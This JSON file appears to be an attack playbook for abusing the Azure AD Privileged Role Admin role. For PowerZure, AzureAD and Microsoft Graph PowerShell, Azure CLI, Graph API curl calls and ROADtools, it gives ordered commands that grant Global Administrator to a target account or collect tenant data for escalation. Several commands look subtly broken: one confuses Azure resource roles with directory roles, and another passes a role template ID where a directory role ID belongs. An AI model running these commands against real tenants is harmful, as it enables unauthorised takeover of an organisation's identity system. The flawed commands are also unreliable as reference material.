{
    "AZPrivilegedRoleAdmin": {
        "meaning": "The Privileged Role Admin role can grant any other admin role to another principal at the tenant level. This allows activating the Global Admin role for yourself or for another user.",
        "common": "",
        "windows": {
            "PowerZure": [
                {
                    "order": 1,
                    "command": "Import-Module PowerZure",
                    "description": "Import PowerZure module"
                },
                {
                    "order": 2,
                    "command": "Connect-AzAccount",
                    "description": "Connect to Azure account"
                },
                {
                    "order": 3,
                    "command": "Add-AzureADRole -RoleName 'Global Administrator' -UserPrincipalName 'target@domain.com'",
                    "description": "Grant Global Administrator role to target user using PowerZure"
                }
            ],
            "PowerShell_AzureAD": [
                {
                    "order": 1,
                    "command": "Install-Module AzureAD -Force",
                    "description": "Install Azure AD PowerShell module"
                },
                {
                    "order": 2,
                    "command": "Connect-AzureAD",
                    "description": "Connect to Azure AD"
                },
                {
                    "order": 3,
                    "command": "$role = Get-AzureADDirectoryRole | Where-Object {$_.DisplayName -eq 'Global Administrator'}",
                    "description": "Get Global Administrator role object"
                },
                {
                    "order": 4,
                    "command": "$user = Get-AzureADUser -ObjectId 'target@domain.com'",
                    "description": "Get target user object"
                },
                {
                    "order": 5,
                    "command": "Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $user.ObjectId",
                    "description": "Add user to Global Administrator role"
                }
            ],
            "PowerShell_MSGraph": [
                {
                    "order": 1,
                    "command": "Install-Module Microsoft.Graph -Force",
                    "description": "Install Microsoft Graph PowerShell module"
                },
                {
                    "order": 2,
                    "command": "Connect-MgGraph -Scopes 'RoleManagement.ReadWrite.Directory'",
                    "description": "Connect to Microsoft Graph with required permissions"
                },
                {
                    "order": 3,
                    "command": "$roleDefinition = Get-MgDirectoryRoleTemplate | Where-Object {$_.DisplayName -eq 'Global Administrator'}",
                    "description": "Get Global Administrator role template"
                },
                {
                    "order": 4,
                    "command": "New-MgDirectoryRoleMemberByRef -DirectoryRoleId $roleDefinition.Id -OdataId \"https://graph.microsoft.com/v1.0/users/target@domain.com\"",
                    "description": "Assign Global Administrator role to target user"
                }
            ]
        },
        "linux": {
            "AzureCLI": [
                {
                    "order": 1,
                    "command": "az login",
                    "description": "Login to Azure account"
                },
                {
                    "order": 2,
                    "command": "az ad user show --id target@domain.com --query objectId -o tsv",
                    "description": "Get target user object ID"
                },
                {
                    "order": 3,
                    "command": "az role assignment create --assignee target@domain.com --role 'Global Administrator' --scope '/'",
                    "description": "Assign Global Administrator role to target user"
                }
            ],
            "MSGraph_API": [
                {
                    "order": 1,
                    "command": "# Get access token with appropriate permissions",
                    "description": "Obtain access token for Microsoft Graph API"
                },
                {
                    "order": 2,
                    "command": "curl -X GET 'https://graph.microsoft.com/v1.0/directoryRoleTemplates' -H 'Authorization: Bearer $TOKEN' | jq '.value[] | select(.displayName==\"Global Administrator\")'",
                    "description": "Get Global Administrator role template ID"
                },
                {
                    "order": 3,
                    "command": "curl -X POST 'https://graph.microsoft.com/v1.0/directoryRoles/$ROLE_ID/members/$ref' -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: application/json' -d '{\"@odata.id\": \"https://graph.microsoft.com/v1.0/users/target@domain.com\"}'",
                    "description": "Add user to Global Administrator role via Graph API"
                }
            ],
            "ROADtools": [
                {
                    "order": 1,
                    "command": "roadrecon auth -u user@domain.com -p password",
                    "description": "Authenticate with ROADtools"
                },
                {
                    "order": 2,
                    "command": "roadrecon gather --mfa",
                    "description": "Gather Azure information including role assignments"
                },
                {
                    "order": 3,
                    "command": "# Use gathered information to identify privilege escalation paths",
                    "description": "Analyze collected data for privilege escalation opportunities"
                }
            ]
        }
    }
}
